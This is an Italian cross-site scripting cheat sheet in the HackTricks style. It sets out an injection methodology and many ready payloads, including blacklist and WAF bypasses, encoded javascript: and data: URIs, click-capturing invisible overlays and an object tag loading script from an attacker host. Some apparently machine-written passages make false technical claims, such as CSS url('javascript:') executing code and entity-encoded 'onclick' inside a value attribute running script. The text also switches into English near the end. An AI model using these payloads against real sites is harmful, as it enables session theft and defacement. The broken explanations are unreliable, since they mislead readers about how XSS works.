# XSS (Cross Site Scripting)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**Consiglio per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per bug bounty creata da hacker, per hacker! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Metodologia

1. Verifica se **qualsiasi valore che controlli** (_parametri_, _percorso_, _intestazioni_?, _cookie_?) viene **riflesso** nell'HTML o viene **utilizzato** dal codice **JS**.
2. **Trova il contesto** in cui viene riflesso/utilizzato.
3. Se viene **riflesso**
1. Verifica **quali simboli puoi utilizzare** e in base a ciò, prepara il payload:
1. In **HTML grezzo**:
1. Puoi creare nuovi tag HTML?
2. Puoi utilizzare eventi o attributi che supportano il protocollo `javascript:`?
3. Puoi aggirare le protezioni?
4. Il contenuto HTML viene interpretato da un motore JS lato client (_AngularJS_, _VueJS_, _Mavo_...), potresti sfruttare una [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Se non puoi creare tag HTML che eseguono codice JS, potresti sfruttare una [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/).
2. All'interno di un **tag HTML**:
1. Puoi uscire dal contesto HTML grezzo?
2. Puoi creare nuovi eventi/attributi per eseguire codice JS?
3. L'attributo in cui sei intrappolato supporta l'esecuzione di JS?
4. Puoi aggirare le protezioni?
3. All'interno del codice **JavaScript**:
1. Puoi evitare il tag `<script>`?
2. Puoi evitare la stringa ed eseguire diverso codice JS?
3. I tuoi input sono all'interno di template letterali \`\`?
4. Puoi aggirare le protezioni?
4. Funzione JavaScript **in esecuzione**
1. Puoi indicare il nome della funzione da eseguire. ad esempio: `?callback=alert(1)`
4. Se viene **utilizzato**:
1. Potresti sfruttare un **DOM XSS**, presta attenzione a come il tuo input è controllato e se il tuo **input controllato viene utilizzato da qualche sink**.

Quando lavori su un XSS complesso, potrebbe essere interessante conoscere:

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## Valori riflesi

Per sfruttare con successo un XSS, la prima cosa che devi trovare è un **valore controllato da te che viene riflesso** nella pagina web.

* **Riflesso interamente**: Se scopri che il valore di un parametro o persino il percorso viene riflesso nella pagina web, potresti sfruttare un **Reflected XSS**.
* **Salvato e riflesso**: Se scopri che un valore controllato da te viene salvato nel server e viene riflesso ogni volta che accedi a una pagina, potresti sfruttare un **Stored XSS**.
* **Accesso tramite JS**: Se scopri che un valore controllato da te viene accesso utilizzando JS, potresti sfruttare un **DOM XSS**.

## Contesti

Quando cerchi di sfruttare un XSS, la prima cosa che devi sapere è **dove viene riflesso il tuo input**. A seconda del contesto, sarai in grado di eseguire codice JS arbitrario in modi diversi.

### HTML grezzo

Se il tuo input viene **riflesso nell'HTML grezzo** della pagina, dovrai sfruttare alcuni **tag HTML** per eseguire codice JS: `<img , <iframe , <svg , <script` ... questi sono solo alcuni dei molti tag HTML possibili che potresti utilizzare.\
Inoltre, tieni presente [Client Side Template Injection](../client-side-template-injection-csti.md).

### All'interno dell'attributo dei tag HTML

Se il tuo input viene riflesso all'interno del valore dell'attributo di un tag, puoi provare:

1. A **uscire dall'attributo e dal tag** (quindi sarai nell'HTML grezzo) e creare un nuovo tag HTML da sfruttare: `"><img [...]`
2. Se **puoi uscire dall'attributo ma non dal tag** (`>` è codificato o eliminato), a seconda del tag potresti **creare un evento** che esegue codice JS: `" autofocus onfocus=alert(1) x="`
3. Se **non puoi uscire dall'attributo** (`"` viene codificato o eliminato), allora a seconda di **quale attributo** riflette il tuo valore e se controlli tutto il valore o solo una parte, sarai in grado di sfruttarlo. Ad esempio, se controlli un evento come `onclick=`, sarai in grado di farlo eseguire codice arbitrario quando viene cliccato. Un altro esempio interessante è l'attributo `href`, dove puoi utilizzare il protocollo `javascript:` per eseguire codice arbitrario: **`href="javascript:alert(1)"`**
4. Se il tuo input viene riflesso all'interno di tag "**non sfruttabili**", puoi provare il trucco **`accesskey`** per sfruttare la vulnerabilità (avrai bisogno di qualche forma di ingegneria sociale per sfruttarlo): **`" accesskey="x" onclick="alert(1)" x="`**

### All'interno del codice JavaScript

In questo caso, il tuo input viene riflesso tra i tag **`<script> [...] </script>`** di una pagina HTML, all'interno di un file `.js` o all'interno di un attributo utilizzando il protocollo **`javascript:`**:

* Se viene riflesso tra i tag **`<script> [...] </script>`**, anche se il tuo input è all'interno di qualsiasi tipo di virgolette, puoi provare a iniettare `</script>` ed uscire da questo contesto. Questo funziona perché il **browser analizzerà prima i tag HTML** e quindi il contenuto, quindi non si accorgerà che il tuo tag `</script>` iniettato è all'interno del codice HTML.
* Se viene riflesso **all'interno di una stringa JS** e il trucco precedente non funziona, dovrai **uscire** dalla stringa, **eseguire** il tuo codice e **ricostruire** il codice JS (se c'è qualche errore, non verrà eseguito):
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* Se viene riflesso all'interno di template letterali, puoi **inserire espressioni JS** utilizzando la sintassi `${ ... }`: `` var greetings = `Ciao, ${alert(1)}` ``
* La codifica **Unicode** funziona per scrivere **codice JavaScript valido**:
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Hoisting di Javascript

L'hoisting di Javascript si riferisce alla possibilità di **dichiarare funzioni, variabili o classi dopo che sono state utilizzate, in modo da poter sfruttare scenari in cui un XSS utilizza variabili o funzioni non dichiarate.**\
**Controlla la seguente pagina per ulteriori informazioni:**

{% content-ref url="js-hoisting.md" %}
[js-hoisting.md](js-hoisting.md)
{% endcontent-ref %}

### Funzione Javascript

Diverse pagine web hanno endpoint che **accettano come parametro il nome della funzione da eseguire**. Un esempio comune che si può trovare è qualcosa del tipo: `?callback=callbackFunc`.

Un buon modo per scoprire se qualcosa fornito direttamente dall'utente sta cercando di essere eseguito è **modificare il valore del parametro** (ad esempio in 'Vulnerable') e cercare nella console eventuali errori come:

![](<../../.gitbook/assets/image (651) (2).png>)

Nel caso sia vulnerabile, potresti essere in grado di **scatenare un alert** semplicemente inviando il valore: **`?callback=alert(1)`**. Tuttavia, è molto comune che questi endpoint **validino il contenuto** per consentire solo lettere, numeri, punti e underscore (**`[\w\._]`**).

Tuttavia, anche con tale limitazione, è ancora possibile eseguire alcune azioni. Ciò è possibile perché è possibile utilizzare quei caratteri validi per **accedere a qualsiasi elemento nel DOM**:

![](<../../.gitbook/assets/image (662).png>)

Alcune funzioni utili per questo:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Puoi anche provare a **attivare le funzioni Javascript** direttamente: `obj.sales.delOrders`.

Tuttavia, di solito gli endpoint che eseguono la funzione indicata sono endpoint senza un DOM molto interessante, **altre pagine nella stessa origine** avranno un **DOM più interessante** per eseguire più azioni.

Pertanto, al fine di **sfruttare questa vulnerabilità in un DOM diverso**, è stata sviluppata l'exploit **Same Origin Method Execution (SOME)**:

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

C'è del **codice JS** che utilizza in modo **non sicuro** dei **dati controllati da un attaccante** come `location.href`. Un attaccante potrebbe sfruttare questo per eseguire codice JS arbitrario.

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universal XSS**

Questo tipo di XSS può essere trovato **ovunque**. Non dipendono solo dall'exploit del client di un'applicazione web, ma da **qualsiasi** **contesto**. Questo tipo di **esecuzione arbitraria di JavaScript** può persino essere sfruttato per ottenere **RCE**, **leggere** **file arbitrari** nei client e nei server, e altro ancora.\
Alcuni **esempi**:

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## Bypass WAF codifica immagine

![da https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## Iniezione all'interno di HTML grezzo

Quando il tuo input viene riflessato **all'interno della pagina HTML** o puoi eseguire l'escape e iniettare codice HTML in questo contesto, la **prima** cosa che devi fare è verificare se puoi sfruttare `<` per creare nuovi tag: Prova semplicemente a **riflettere** quel **carattere** e verifica se viene **codificato in HTML** o **eliminato** o se viene **riflessato senza modifiche**. **Solo in quest'ultimo caso sarai in grado di sfruttare questo caso**.\
Per questi casi, tieni anche presente [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Nota: Un commento HTML può essere chiuso usando `-->` o `--!>`**_

In questo caso, se non viene utilizzata una lista nera/lista bianca, potresti utilizzare payload come:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
Ma, se viene utilizzato un sistema di blacklist/whitelist per i tag/attributi, sarà necessario **forzare l'individuazione dei tag** che è possibile creare.\
Una volta che hai **individuato quali tag sono consentiti**, dovrai **forzare gli attributi/gli eventi** all'interno dei tag validi trovati per capire come attaccare il contesto.

### Forzare i tag/gli eventi

Vai su [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) e clicca su _**Copia i tag negli appunti**_. Successivamente, invia tutti i tag utilizzando Burp Intruder e verifica se qualche tag non è stato riconosciuto come dannoso dal WAF. Una volta scoperti i tag che puoi utilizzare, puoi **forzare tutti gli eventi** utilizzando i tag validi (nella stessa pagina web, clicca su _**Copia gli eventi negli appunti**_ e segui la stessa procedura di prima).

### Tag personalizzati

Se non hai trovato nessun tag HTML valido, puoi provare a **creare un tag personalizzato** ed eseguire del codice JS con l'attributo `onfocus`. Nella richiesta XSS, devi terminare l'URL con `#` per fare in modo che la pagina **si concentri su quell'oggetto** ed **esegua** il codice:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Bypass delle Blacklist

Se viene utilizzata una blacklist, è possibile provare a bypassarla con alcuni trucchi banali:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Bypass della lunghezza (piccoli XSS)

{% hint style="info" %}
**Altri piccoli XSS per diversi ambienti** il payload [**può essere trovato qui**](https://github.com/terjanq/Tiny-XSS-Payloads) e [**qui**](https://tinyxss.terjanq.me).
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
L'ultimo utilizza 2 caratteri unicode che si espandono in 5: telsr\
Altri di questi caratteri possono essere trovati [qui](https://www.unicode.org/charts/normalization/).\
Per verificare in quali caratteri sono decomposti, controlla [qui](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Se per sfruttare la vulnerabilità è necessario che l'utente faccia clic su un link o un modulo con dati precompilati, potresti provare a [abusare del Clickjacking](../clickjacking.md#xss-clickjacking) (se la pagina è vulnerabile).

### Impossibile - Dangling Markup

Se pensi semplicemente che sia impossibile creare un tag HTML con un attributo per eseguire codice JS, dovresti controllare [Dangling Markup](../dangling-markup-html-scriptless-injection/) perché potresti sfruttare la vulnerabilità senza eseguire codice JS.

## Iniezione all'interno del tag HTML

### All'interno del tag/fuga dal valore dell'attributo

Se ti trovi all'interno di un tag HTML, la prima cosa che potresti provare è fuggire dal tag e utilizzare alcune delle tecniche menzionate nella [sezione precedente](./#injecting-inside-raw-html) per eseguire codice JS.\
Se non puoi fuggire dal tag, puoi creare nuovi attributi all'interno del tag per cercare di eseguire codice JS, ad esempio utilizzando un payload come (_nota che in questo esempio vengono utilizzate virgolette doppie per fuggire dall'attributo, non ne avrai bisogno se il tuo input viene riflessa direttamente all'interno del tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Eventi di stile**

Gli eventi di stile sono una tecnica di Cross-Site Scripting (XSS) che sfrutta la possibilità di inserire codice JavaScript all'interno degli attributi di stile di un elemento HTML. Questo tipo di attacco può essere eseguito quando un'applicazione web non valida o filtra in modo inadeguato l'input fornito dagli utenti.

L'obiettivo principale degli eventi di stile è eseguire codice JavaScript malevolo quando l'evento di stile viene attivato. Ad esempio, è possibile sfruttare l'evento `onload` per eseguire codice al caricamento di una pagina, o l'evento `onmouseover` per eseguire codice quando il cursore passa sopra un elemento.

Per eseguire un attacco di XSS utilizzando gli eventi di stile, è necessario inserire il codice JavaScript all'interno degli attributi di stile di un elemento HTML. Ad esempio:

```html
<div style="background-image: url('javascript:alert(1)')"></div>
```

In questo esempio, quando il browser interpreta il codice HTML, eseguirà l'evento di stile `background-image` e il codice JavaScript `alert(1)` verrà eseguito.

Per mitigare gli attacchi XSS basati sugli eventi di stile, è importante validare e filtrare correttamente l'input fornito dagli utenti. Inoltre, è possibile utilizzare librerie o framework che offrono funzionalità di protezione XSS, come l'escape automatico dei caratteri speciali.
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### All'interno dell'attributo

Anche se **non puoi evadere dall'attributo** (`"` viene codificato o eliminato), a seconda di **quale attributo** riflette il valore, se controlli tutto il valore o solo una parte, sarai in grado di abusarne. Ad **esempio**, se controlli un evento come `onclick=`, sarai in grado di eseguire codice arbitrario quando viene cliccato.\
Un altro **esempio** interessante è l'attributo `href`, dove puoi utilizzare il protocollo `javascript:` per eseguire codice arbitrario: **`href="javascript:alert(1)"`**

**Bypass all'interno dell'evento utilizzando la codifica HTML/codifica URL**

I caratteri **codificati in HTML** all'interno del valore degli attributi dei tag HTML vengono **decodificati durante l'esecuzione**. Pertanto, qualcosa come il seguente sarà valido (il payload è in grassetto): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Nota che **qualsiasi tipo di codifica HTML è valido**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Nota che l'URL encoding funzionerà anche:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass dell'evento interno utilizzando la codifica Unicode**

In alcuni casi, potrebbe essere necessario bypassare i filtri di input che bloccano gli eventi interni come `onclick`, `onmouseover`, ecc. Una tecnica comune per farlo è utilizzare la codifica Unicode per evitare la rilevazione del codice JavaScript.

Ad esempio, se il filtro blocca l'uso di `onclick`, possiamo bypassarlo utilizzando la codifica Unicode per rappresentare la stringa `onclick`. La codifica Unicode per `onclick` è `\u006f\u006e\u0063\u006c\u0069\u0063\u006b`. Pertanto, possiamo utilizzare questa codifica per aggirare il filtro e inserire il nostro codice JavaScript.

Ecco un esempio di come utilizzare la codifica Unicode per bypassare un filtro che blocca `onclick`:

```html
<input type="text" value="&#x6f;&#x6e;&#x63;&#x6c;&#x69;&#x63;&#x6b;=alert('XSS')" />
```

In questo esempio, stiamo utilizzando la codifica Unicode per `onclick` (`&#x6f;&#x6e;&#x63;&#x6c;&#x69;&#x63;&#x6b;`) per aggirare il filtro. Quando il campo di input viene visualizzato nella pagina, il codice JavaScript `alert('XSS')` verrà eseguito.

Questa tecnica può essere utilizzata per bypassare i filtri di input che bloccano gli eventi interni, consentendo l'inserimento di codice JavaScript dannoso. Tuttavia, è importante notare che questa tecnica potrebbe non funzionare in tutti i contesti, poiché dipende dalla configurazione del filtro e dalla gestione delle codifiche Unicode.
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Protocolli speciali all'interno dell'attributo

Qui puoi utilizzare i protocolli **`javascript:`** o **`data:`** in alcuni punti per **eseguire codice JS arbitrario**. Alcuni richiederanno l'interazione dell'utente, altri no.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Luoghi in cui è possibile iniettare questi protocolli**

**In generale**, il protocollo `javascript:` può essere **utilizzato in qualsiasi tag che accetta l'attributo `href`** e nella **maggior parte** dei tag che accettano l'attributo `src` (ma non `<img`)
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Altri trucchi di oscuramento**

_**In questo caso, l'encoding HTML e il trucco dell'encoding Unicode della sezione precedente sono validi anche perché ti trovi all'interno di un attributo.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Inoltre, c'è un altro **bel trucco** per questi casi: **Anche se il tuo input all'interno di `javascript:...` viene codificato URL, verrà decodificato URL prima di essere eseguito.** Quindi, se hai bisogno di **scappare** dalla **stringa** usando un **apostrofo singolo** e vedi che **viene codificato URL**, ricorda che **non importa**, verrà **interpretato** come un **apostrofo singolo** durante l'**esecuzione**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Nota che se provi a **usare entrambi** `URLencode + HTMLencode` in qualsiasi ordine per codificare il **payload** non funzionerà, ma puoi **mescolarli all'interno del payload**.

**Utilizzando la codifica esadecimale e ottale con `javascript:`**

Puoi utilizzare la codifica **esadecimale** e **ottale** all'interno dell'attributo `src` di `iframe` (almeno) per dichiarare **tag HTML da eseguire in JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing

Reverse tab nabbing è una tecnica di attacco che sfrutta una vulnerabilità di sicurezza nelle applicazioni web. Questa tecnica consente a un attaccante di dirottare l'attenzione dell'utente su una scheda aperta e di utilizzarla per eseguire azioni dannose senza il consenso dell'utente.

Il funzionamento di Reverse tab nabbing è il seguente:

1. L'attaccante crea un sito web malevolo che contiene un link a un sito legittimo.
2. Quando l'utente visita il sito malevolo e clicca sul link, viene aperta una nuova scheda con il sito legittimo.
3. Nel frattempo, il sito malevolo modifica il contenuto della scheda originale, ad esempio tramite JavaScript, per visualizzare un falso messaggio di errore o richiedere l'autenticazione.
4. L'utente, ignaro del dirottamento, potrebbe inserire le proprie credenziali o altre informazioni sensibili nella scheda modificata.
5. L'attaccante può quindi raccogliere queste informazioni e utilizzarle a scopo malevolo.

Per proteggersi da Reverse tab nabbing, gli sviluppatori di applicazioni web dovrebbero adottare le seguenti misure di sicurezza:

- Validare e filtrare attentamente tutti i dati in ingresso per prevenire l'inserimento di script malevoli.
- Utilizzare l'attributo `rel="noopener"` nei link che aprono nuove schede per impedire il dirottamento.
- Informare gli utenti sui rischi associati al cliccare su link provenienti da fonti non attendibili o sospette.

Gli utenti, d'altra parte, dovrebbero essere consapevoli dei rischi associati alla navigazione su siti web non attendibili e prestare attenzione ai messaggi di errore o alle richieste di autenticazione inaspettate.
```javascript
<a target="_blank" rel="opener"
```
Se puoi iniettare qualsiasi URL in un tag **`<a href=`** arbitrario che contiene gli attributi **`target="_blank"`** e **`rel="opener"`**, controlla la **pagina seguente per sfruttare questo comportamento**:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### Bypass sugli Event Handlers

Prima di tutto, controlla questa pagina ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) per utili **event handlers "on"**.\
Nel caso in cui ci sia una blacklist che impedisce di creare questi event handlers, puoi provare i seguenti bypass:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Tag non sfruttabili" (input nascosti, link, canonical, meta)

Da [**qui**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **ora è possibile abusare degli input nascosti con:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
E nei **meta tag**:
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Da [**qui**](https://portswigger.net/research/xss-in-hidden-input-fields): È possibile eseguire un **payload XSS all'interno di un attributo nascosto**, a condizione che si riesca a **persuadere** la **vittima** a premere la **combinazione di tasti**. Su Firefox Windows/Linux la combinazione di tasti è **ALT+SHIFT+X** e su OS X è **CTRL+ALT+X**. È possibile specificare una diversa combinazione di tasti utilizzando un diverso tasto nell'attributo access key. Ecco il vettore:
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Il payload XSS sarà qualcosa del genere: `" accesskey="x" onclick="alert(1)" x="`**

### Bypass delle blacklist

Sono già stati esposti diversi trucchi che utilizzano diverse codifiche all'interno di questa sezione. Torna indietro per imparare dove puoi utilizzare:

* **Codifica HTML (tag HTML)**
* **Codifica Unicode (può essere un codice JS valido):** `\u0061lert(1)`
* **Codifica URL**
* **Codifica esadecimale e ottale**
* **Codifica dati**

**Bypass per tag e attributi HTML**

Leggi i [Bypass delle blacklist della sezione precedente](./#blacklist-bypasses).

**Bypass per codice JavaScript**

Leggi i [bypass delle blacklist JavaScript della sezione successiva](./#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Se hai trovato un **XSS in una parte molto piccola** del web che richiede una certa interazione (ad esempio un piccolo link nel piè di pagina con un elemento onmouseover), puoi provare a **modificare lo spazio che l'elemento occupa** per massimizzare le probabilità di far scattare il link.

Ad esempio, potresti aggiungere qualche stile all'elemento come: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Ma se il WAF sta filtrando l'attributo style, puoi utilizzare i CSS Styling Gadgets, quindi se trovi, ad esempio

> .test {display:block; color: blue; width: 100%\}

e

> \#someid {top: 0; font-family: Tahoma;}

Ora puoi modificare il nostro link e portarlo alla forma

> \<a href="" id=someid class=test onclick=alert() a="">

Questo trucco è stato preso da [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Iniezione all'interno del codice JavaScript

In questo caso, il tuo **input** verrà **riflesso all'interno del codice JS** di un file `.js` o tra i tag `<script>...</script>` o tra gli eventi HTML che possono eseguire codice JS o tra gli attributi che accettano il protocollo `javascript:`.

### Escape del tag \<script>

Se il tuo codice viene inserito all'interno di `<script> [...] var input = 'reflected data' [...] </script>`, puoi facilmente **escapare chiudendo il tag `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Nota che in questo esempio **non abbiamo nemmeno chiuso l'apostrofo singolo**. Questo perché **l'analisi HTML viene eseguita prima dal browser**, che comporta l'identificazione degli elementi della pagina, inclusi i blocchi di script. L'analisi di JavaScript per comprendere ed eseguire gli script incorporati viene eseguita solo successivamente.

### All'interno del codice JS

Se `<>` vengono sanificati, è comunque possibile **eseguire l'escape della stringa** nel punto in cui viene **posizionato** l'input e **eseguire JS arbitrario**. È importante **correggere la sintassi JS**, perché se ci sono errori, il codice JS non verrà eseguito:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### Template letterali \`\`

Per costruire **stringhe** oltre alle virgolette singole e doppie, JS accetta anche i **backtick** **` `` `**. Questo è noto come template letterali in quanto consentono di **inserire espressioni JS** utilizzando la sintassi `${ ... }`.\
Pertanto, se scopri che il tuo input viene **riflesso** all'interno di una stringa JS che utilizza i backtick, puoi sfruttare la sintassi `${ ... }` per eseguire **codice JS arbitrario**:

Questo può essere **sfruttato** utilizzando:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### Esecuzione del codice codificato

Sometimes, web applications may apply encoding or filtering techniques to prevent the execution of malicious code. However, it is still possible to bypass these security measures and execute encoded code.

In order to achieve this, you can use different techniques such as double encoding, mixed encoding, or using different character sets. The idea is to encode the malicious code in a way that it bypasses the filters and is executed by the application.

For example, if the application filters the "<" character, you can encode it as "&lt;" or "%3C" to bypass the filter. Similarly, you can encode other characters or use different encodings to bypass different filters.

It is important to note that the success of this technique depends on the specific encoding and filtering techniques implemented by the application. Therefore, it is necessary to analyze the application and understand how it handles encoded input.

